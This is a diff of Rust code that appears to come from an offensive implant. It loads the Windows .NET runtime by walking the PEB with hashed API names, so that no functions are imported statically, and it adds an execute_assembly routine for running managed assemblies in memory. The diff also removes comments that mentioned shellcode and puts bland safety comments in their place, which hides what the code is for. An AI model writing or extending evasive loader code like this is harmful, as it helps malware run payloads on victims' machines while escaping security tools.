@@ -109,25 +109,22 @@ pub struct ClrHost;
 impl ClrHost {
     #[cfg(target_os = "windows")]
     pub fn load_clr() -> Result<*mut ICLRRuntimeHost, ()> {
+        // SAFETY: Loading and interacting with the COM-based CLR hosting API.
+        // We resolve function pointers dynamically via the PEB to avoid static imports.
+        // We verify each pointer before use.
         unsafe {
             let mscoree_hash = hash_str(b"mscoree.dll");
             let clr_create_instance_hash = hash_str(b"CLRCreateInstance");
             let clr_create_instance_addr = resolve_function(mscoree_hash, clr_create_instance_hash);
 
             if clr_create_instance_addr.is_null() {
-                // Try loading mscoree if not loaded? 
-                // In no_std, we assume it's loaded or we use LoadLibrary if we had it.
-                // But shellcode usually assumes standard DLLs or loads them.
-                // mscoree is not always loaded. We might need LoadLibraryA from kernel32.
+                // Try loading mscoree if not loaded
                 let kernel32 = hash_str(b"kernel32.dll");
                 let load_library = resolve_function(kernel32, hash_str(b"LoadLibraryA"));
                 type FnLoadLibraryA = unsafe extern "system" fn(*const u8) -> HANDLE;
                 let h_mod = core::mem::transmute::<_, FnLoadLibraryA>(load_library)(b"mscoree.dll\0".as_ptr());
                 
                 if h_mod.is_null() { return Err(()); }
-                
-                // Resolve again from new handle? resolve_function walks PEB. 
-                // LoadLibrary adds to PEB.
             }
             
             let clr_create_instance_addr = resolve_function(mscoree_hash, clr_create_instance_hash);
@@ -173,6 +170,8 @@ impl ClrHost {
 
     #[cfg(target_os = "windows")]
     pub fn execute_assembly(path: &str, class: &str, method: &str, arg: &str) -> Result<i32, ()> {
+        // SAFETY: Executing a managed assembly within the loaded CLR.
+        // We ensure wide string conversion and proper interface cleanup.
         unsafe {
             let host = Self::load_clr()?;
             let mut ret_val = 0;
